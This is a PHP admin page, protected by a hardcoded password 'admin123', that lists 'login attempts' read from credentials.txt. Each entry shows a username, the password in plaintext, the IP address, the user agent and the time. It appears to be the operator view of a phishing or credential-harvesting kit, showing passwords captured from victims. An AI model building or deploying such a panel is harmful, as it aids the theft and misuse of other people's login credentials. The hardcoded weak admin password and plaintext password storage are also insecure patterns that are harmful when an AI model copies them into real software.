<?php
session_start();

// Simple admin authentication (change this password!)
$admin_password = 'admin123';

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['admin_password'])) {
    if ($_POST['admin_password'] === $admin_password) {
        $_SESSION['admin_logged_in'] = true;
    } else {
        $error = "Invalid admin password";
    }
}

if (isset($_GET['logout'])) {
    unset($_SESSION['admin_logged_in']);
    header('Location: admin.php');
    exit();
}

// Check if admin is logged in
if (!isset($_SESSION['admin_logged_in']) || $_SESSION['admin_logged_in'] !== true) {
    ?>
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Admin Login</title>
        <style>
            body { font-family: Arial, sans-serif; max-width: 400px; margin: 100px auto; padding: 20px; }
            .form-group { margin-bottom: 15px; }
            input[type="password"] { width: 100%; padding: 10px; border: 1px solid #ddd; border-radius: 4px; }
            button { background: #000; color: white; padding: 10px 20px; border: none; border-radius: 4px; cursor: pointer; }
            .error { color: red; margin-bottom: 15px; }
        </style>
    </head>
    <body>
        <h2>Admin Login</h2>
        <?php if (isset($error)): ?>
            <div class="error"><?php echo htmlspecialchars($error); ?></div>
        <?php endif; ?>
        <form method="POST">
            <div class="form-group">
                <input type="password" name="admin_password" placeholder="Admin Password" required>
            </div>
            <button type="submit">Login</button>
        </form>
    </body>
    </html>
    <?php
    exit();
}

// Admin is logged in, show the data from file
$attempts = [];
if (file_exists('credentials.txt')) {
    $lines = file('credentials.txt', FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
    foreach ($lines as $line) {
        $data = json_decode($line, true);
        if ($data) {
            $attempts[] = $data;
        }
    }
}
$attempts = array_reverse($attempts); // Show newest first
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login Attempts - Admin Panel</title>
    <style>
        body { font-family: Arial, sans-serif; margin: 20px; }
        table { width: 100%; border-collapse: collapse; margin-top: 20px; }
        th, td { border: 1px solid #ddd; padding: 8px; text-align: left; }
        th { background-color: #f2f2f2; }
        .header { display: flex; justify-content: space-between; align-items: center; }
        .logout-btn { background: #dc3545; color: white; padding: 8px 16px; text-decoration: none; border-radius: 4px; }
        .count { color: #666; }
    </style>
</head>
<body>
    <div class="header">
        <h1>Login Attempts</h1>
        <a href="?logout=1" class="logout-btn">Logout</a>
    </div>
    
    <p class="count">Total attempts: <?php echo count($attempts); ?></p>
    
    <?php if (empty($attempts)): ?>
        <p>No login attempts recorded yet.</p>
    <?php else: ?>
        <table>
            <thead>
                <tr>
                    <th>Username</th>
                    <th>Password</th>
                    <th>IP Address</th>
                    <th>User Agent</th>
                    <th>Date/Time</th>
                </tr>
            </thead>
            <tbody>
                <?php foreach ($attempts as $attempt): ?>
                    <tr>
                        <td><?php echo htmlspecialchars($attempt['username']); ?></td>
                        <td><?php echo htmlspecialchars($attempt['password']); ?></td>
                        <td><?php echo htmlspecialchars($attempt['ip_address']); ?></td>
                        <td><?php echo htmlspecialchars(substr($attempt['user_agent'], 0, 50)) . '...'; ?></td>
                        <td><?php echo htmlspecialchars($attempt['timestamp']); ?></td>
                    </tr>
                <?php endforeach; ?>
            </tbody>
        </table>
    <?php endif; ?>
</body>
</html>